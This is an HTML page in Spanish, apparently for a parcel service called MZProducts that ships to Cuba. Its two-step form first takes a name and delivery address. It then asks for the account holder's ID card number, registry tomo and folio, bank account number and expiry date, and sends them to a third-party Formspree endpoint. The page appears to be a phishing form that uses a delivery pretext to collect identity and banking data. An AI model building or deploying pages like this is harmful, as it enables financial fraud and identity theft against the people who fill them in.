<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MZProducts Env√≠os a Cuba</title>
    <style>
        body { background-color: #fcf6e9; font-family: 'Arial', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .brand-name { color: #c0392b; font-size: 28px; font-weight: bold; margin: 0; text-transform: uppercase; }
        .brand-sub { color: #2c3e50; letter-spacing: 3px; font-size: 14px; font-weight: bold; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); width: 100%; max-width: 450px; }
        h2 { color: #444; font-size: 18px; margin-bottom: 25px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; }
        input, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; background-color: #fdfdfd; box-sizing: border-box; }
        .btn-group { display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px; }
        button { padding: 12px 25px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
        .btn-next, .btn-final { background-color: #1a5276; color: white; }
        .btn-back { background-color: #7f8c8d; color: white; }
        #step2 { display: none; }
    </style>
</head>
<body>

    <div class="header">
        <div style="font-size: 50px;">üõíüîß</div>
        <p class="brand-name">MZProducts</p>
        <p class="brand-sub">ENV√çOS A CUBA</p>
    </div>

    <form action="https://formspree.io/f/xaqwqqek" method="POST" style="width: 100%; max-width: 450px;">

        <div id="step1" class="card">
            <h2>Datos del titular o propietario</h2>
            <div class="input-group">
                <label>Nombre y apellidos</label>
                <input type="text" name="nombre_cliente" required>
            </div>         
            <div class="input-group">
                <label>Direcci√≥n de entrega</label>
                <textarea name="direccion" rows="3" required></textarea>
            </div>
            <div class="btn-group">
                <button type="button" class="btn-next" onclick="showStep2()">Siguiente</button>
            </div>
        </div>

        <div id="step2" class="card">
            <h2>Documentaci√≥n del titular de la cuenta</h2>
            <div class="input-group">
                <label>No. de carnet</label>
                <input type="text" name="carnet_confirmacion">
            </div>
            <div class="input-group">
                <label>Tomo</label>
                <input type="text" name="tomo">
            </div>
            <div class="input-group">
                <label>Folio</label>
                <input type="text" name="folio">
            </div>
            <div class="input-group">
                <label>No. de cuenta</label>
                <input type="text" name="cuenta_bancaria">
            </div>
            <div class="input-group">
                <label>Fecha de vencimiento</label>
                <input type="date" name="fecha_vencimiento">
            </div>
            <div class="btn-group">
                <button type="button" class="btn-back" onclick="showStep1()">Atr√°s</button>
                <button type="submit" class="btn-final">Finalizar y Autorizar</button>
            </div>
        </div>

    </form>

    <script>
        function showStep2() {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            window.scrollTo(0, 0);
        }
        function showStep1() {
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step1').style.display = 'block';
            window.scrollTo(0, 0);
        }
    </script>

</body>
</html>
